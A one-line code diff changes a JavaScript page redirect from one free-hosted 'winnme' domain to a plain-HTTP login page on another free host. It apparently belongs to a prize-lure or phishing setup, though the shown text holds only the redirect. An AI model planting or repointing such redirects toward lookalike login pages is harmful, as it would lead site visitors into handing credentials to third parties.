@@ -1,1 +1,1 @@
-window.location = "https://winnme.rf.gd";
+window.location = "http://winnme.atwebpages.com/login.html";
